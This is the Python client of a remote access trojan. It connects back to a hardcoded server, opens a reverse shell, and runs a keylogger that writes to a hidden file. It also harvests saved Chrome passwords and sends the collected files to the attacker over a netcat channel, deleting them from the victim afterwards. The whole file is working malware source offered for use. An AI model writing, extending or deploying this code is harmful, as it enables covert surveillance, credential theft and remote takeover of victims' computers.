from connection import Connection
from rev_shell import Shell
import socket
from chrome_passwords import ChromePass
from keylogger import KeyLogger
from time import sleep
import subprocess
import os


class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Gets passwords from google chrome
        - Logs key events to a file
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int = 9001, file_port: int = 9002, keylog_filename: str = ".activity.txt", chromepass_filename: str = ".chrome_log.txt") -> None:
        """
        Constructor

        required:
        :param host: The server's IP
        :param port: The server's port number
        
        optional:
        :param keylog_filename: The file's name where the keystrokes are stored
        :param chromepass_filename: The file name where the chrome passwords are stored
        """

        self.host = host
        self.port = port
        self.file_port = file_port
        self.keylog_filename = keylog_filename
        self.chromepass_filename = chromepass_filename

        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)

        # Create google password collector instance
        self.chrome_pass = ChromePass(self.chromepass_filename)

        # Initialize keylogger instance
        self.keylogger = KeyLogger(self.keylog_filename)


    def run(self) -> None:
        """
        1. Stores google chrome passwords to file
        2. Starts logging key events to file
        3. Gets a reverse shell from client to server
        """
        
        choice = self.open_menu()
        
        if choice == 1:
            self.shell.get_shell()
            
        elif choice == 2:
            self.keylogger.start_log()
            self.send_data("\n\nKeylogging started to file '{}'...".format(self.keylog_filename), self.sock)
            
        elif choice == 3:
            self.keylogger.end_log()
            self.send_data("\n\nKeylogging stopped...", self.sock)

        elif choice == 4:
            self.chrome_pass.get_chrome_pass()
            self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename), self.sock)
        
        elif choice == 5:
            #ToDo
            pass
            
        elif choice == 6:
            #ToDo
            pass
        
        elif choice == 7:
            self.send_file(self.keylog_filename)
            self.send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)
            
        elif choice == 8:
            self.send_file(self.chromepass_filename)
            self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)

        
        self.run()
            
            

    def open_menu(self) -> int:
        """
        Opens the selection menu to the server

        :param socket: Then socket to send the data through
        
        :returns: The choice of the menu
        """
        
        response = ""
        
        # Opens menu
        menu_str = "\n\n\n\nPlease select one of the functionalities from the following menu: \n \n \
            1) Get a reverse shell \n \
            2) Start keylogger \n \
            3) Stop keylogger \n \
            4) Get chrome passwords \n \
            5) Add RAT to startup \n \
            6) Remove RAT from startup \n \
            7) Receive keylogger file \n \
            8) Receive chrome passwords file \n\n \
            \n Choice: "
        
        self.send_data(menu_str, self.sock)
            
        
        # Receives messages from server
        response = self.receive_data(self.sock)
        
        # Try to convert to int
        try:
            response = int(response)
        except ValueError:
            pass
        
        # Check valid response
        if not response in [1,2,3,4,5,6,7,8]:
            self.send_data("\nNot a valid response!\n", self.sock)
            sleep(2)
            self.open_menu()
        
        return response
        
    
    def send_data(self, data: str, sock: socket) -> None:
        """
        Sends data through socket

        :param data: The data to send
        """
        sock.send(str.encode(data))


    def receive_data(self, sock: socket) -> str:
        """
        Receives data through socket
        """
        
        data = ""
        # Wait until data is received
        while data == "":
            data = sock.recv(1024).decode("UTF-8")
        
        return data
    

    def send_file(self, filename: str) -> None:
        
        response = ""
        
        # Instructions
        self.send_data(f"\nTo receive file {filename}: \n \
        run command in another terminal:\n\n \
        nc -l -p {self.file_port} > {filename} \n", self.sock)
        
        # Wait for enter press
        while not response == "\n":
            self.send_data("Press enter to send file {}: ".format(filename), self.sock)
            response = self.receive_data(self.sock)
        
        # Create file client instance
        file_client = Connection(self.host, self.file_port)
        
        # Open socket connection for file transfer
        file_sock = file_client.connect()
        
        # Open and read file
        with open(filename, "r") as f:
            file_content = f.read()
            
        # Remove file
        os.remove(filename)
        
        # Send the file data
        self.send_data(file_content, file_sock)
        
        # Close connection when finished
        file_sock.close()


if __name__ == "__main__":
    # Run RAT with specified IP and port continiously
    while 1:
        Client("192.168.178.92").run()
